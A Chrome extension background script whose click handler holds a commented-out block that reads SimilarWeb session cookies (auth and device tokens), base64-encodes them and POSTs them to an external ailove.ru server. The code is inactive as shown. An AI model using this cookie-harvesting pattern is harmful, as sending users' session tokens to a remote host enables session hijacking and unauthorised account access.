chrome.browserAction.onClicked.addListener(function(tab) {
    console.log("Plugin click", tab)
    /*
    chrome.cookies.getAll({"url": "https://pro.similarweb.com"}, function(cookie) {
        names = [".SGTOKEN.SIMILARWEB.COM", "sgID", "locale", ".DEVICETOKEN.SIMILARWEB.COM", "intercom-"];
        cookie = cookie.filter(c=> names.indexOf(c.name)>=0);
        cookie = cookie.map(c=>`${c.name}=${c.value}`).reduce((a,b)=>a+'; '+b);
        
        // fetch(`https://vs43.ailove.ru:5555/api/sw/cookie/${btoa(cookie)}`, {method:'POST'})
        // .then(r=>console.log(r))
        // .catch(err=>console.error(err));

        // fetch(`https://vs43.ailove.ru:5556/api/sw/cookie/${btoa(cookie)}`, {method:'POST'})
        // .then(r=>console.log(r))
        // .catch(err=>console.error(err));
        
        fetch(`https://vs290.ailove.ru:5556/api/sw/cookie/${btoa(cookie)}`, {method:'POST'})
        .then(r=>console.log(r))
        .catch(err=>console.error(err));

        // fetch(`http://localhost:5556/api/sw/cookie/${btoa(cookie)}`, {method:'POST'})
        // .then(r=>console.log(r))
        // .catch(err=>console.error(err));

    });
    */

    // chrome.tabs.executeScript(null, {file: "tab_script.js"});
});
